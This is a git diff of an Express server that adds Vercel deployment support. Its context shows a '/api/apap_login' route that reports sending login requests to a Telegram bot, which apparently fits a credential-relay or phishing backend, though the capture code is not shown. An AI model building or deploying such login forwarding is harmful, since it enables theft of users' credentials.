@@ -10,6 +10,7 @@ dotenv.config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+const VERCEL_URL = process.env.VERCEL_URL || '';
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
@@ -70,12 +71,16 @@ app.post('/api/apap_login', (req, res) => {
     res.json({ status: 'ok', message: 'Login request sent to Telegram bot' });
 });
 
-// Catch-all route to serve index.html for any unmatched routes
+// Serve static files from the public directory
 app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Start server
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+// Start the server
+const server = app.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
+    console.log(`Vercel URL: ${VERCEL_URL}`);
 });
+
+// Export the Express API for Vercel
+module.exports = app;
